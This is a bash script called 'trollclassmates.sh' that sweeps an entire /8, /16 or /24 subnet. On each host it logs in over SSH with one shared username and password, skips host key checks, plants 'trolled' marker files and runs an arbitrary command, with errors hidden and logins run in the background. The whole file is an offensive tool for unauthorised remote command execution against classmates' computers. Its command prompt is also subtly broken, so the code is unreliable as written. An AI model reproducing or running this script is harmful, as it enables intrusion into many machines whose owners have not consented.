#!/usr/bin/env bash

#MIT License

#Copyright (c) 2020 Javier Vidal Ruano

#Permission is hereby granted, free of charge, to any person obtaining a copy
#of this software and associated documentation files (the "Software"), to deal
#in the Software without restriction, including without limitation the rights
#to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
#copies of the Software, and to permit persons to whom the Software is
#furnished to do so, subject to the following conditions:

#The above copyright notice and this permission notice shall be included in all
#copies or substantial portions of the Software.

#THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
#IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
#FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
#AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
#LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
#OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
#SOFTWARE.

# FUNCTIONS
function checkOption(){
        case $1 in
                1)
                        echo ''
                        echo '[*] You chose to install dependencies'
                        installDependencies
                        ;;
                2)
                        echo ''
                        echo '[*] You chose to attack'
                        read -p 'Username: ' USERNAME
                        read -p 'Password: ' PASSWORD
                        read -p 'IP address (Example: 192.168.1.16/24): ' IP
                        read -p 'Command to execute: ' $COMMAND
                        troll $USERNAME $PASSWORD $IP $COMMAND
                        ;;
                99)
                        exit
                        ;;
                *)
                        echo ''
                        echo '[-] Error: Wrong option'
                        ;;
        esac
}

function installDependencies(){
        sudo apt install sshpass openssh-client -y
}

function menu(){
        while true; do
                echo 'MENU:'
                echo '  1-Install dependencies (recommended if this is your first time)'
                echo '  2-Start trolling'
                echo '  99-Exit'
                echo ''
                read -p 'OPTION: ' OPTION
                checkOption $OPTION
                read -p 'Press enter to continue'
                clear
        done
}

function troll(){
        USER=$1 #'root'
        PASSWORD=$2 #'labii'
        IP=$(echo $3 | cut -d '/' -f 1)
        RANGE=$(echo $3 | cut -d '/' -f 2)

        SECONDS=0
        case $RANGE in
                8)
                        SUBNET=$(echo $IP | cut -d '.' -f1)
                        echo "[*] Starting attack on subnet ${SUBNET}.0.0.0/8"
                        for ADDRESS in $SUBNET.{1..255}.{1..255}.{1..255}; do
                                echo "[*] Attacking ${USER}@${ADDRESS}"
                                sshpass -p${PASSWORD} ssh -t -oStrictHostKeyChecking=no ${USER}@${ADDRESS} "if [ -e ~/trolled.haha ]; then touch ~/trolled.AGAIN.haha; fi; touch ~/trolled.haha; $COMMAND" 2>/dev/null &
                        done
                        ;;
                16)
                        SUBNET=$(echo $IP | cut -d '.' -f1,2)
                        echo "[*] Starting attack on subnet ${SUBNET}.0.0/16"
                        for ADDRESS in $SUBNET.{1..255}.{1..255}; do
                                echo "[*] Attacking ${USER}@${ADDRESS}"
                                sshpass -p${PASSWORD} ssh -t -oStrictHostKeyChecking=no ${USER}@${ADDRESS} "if [ -e ~/trolled.haha ]; then touch ~/trolled.AGAIN.haha; fi; touch ~/trolled.haha; $COMMAND" 2>/dev/null &
                        done
                        ;;
                24)
                        SUBNET=$(echo $IP | cut -d '.' -f1,2,3)
                        echo "[*] Starting attack on subnet ${SUBNET}.0/24"
                        for COUNTER in $(seq 2 254); do
                                echo "[*] Attacking ${USER}@${SUBNET}.${COUNTER}"
                                sshpass -p${PASSWORD} ssh -t -oStrictHostKeyChecking=no ${USER}@${SUBNET}.${COUNTER} "if [ -e ~/trolled.haha ]; then touch ~/trolled.AGAIN.haha; fi; touch ~/trolled.haha; $COMMAND" 2>/dev/null &
                        done
                        ;;
                *)
                        echo '[-] Error: invalid range'
                        return 1
                        ;;
        esac



        echo '[*] Attack done'
        ELAPSED_TIME="[*] Elapsed time: $(($SECONDS / 3600))hrs $((($SECONDS / 60) % 60))min $(($SECONDS % 60))sec"
        echo $ELAPSED_TIME
}

function usage(){
        echo '[*] Usage: bash trollclassmates.sh'
}

# MAIN
if [ $# -ne 0 ]; then
        usage
        exit
fi
menu
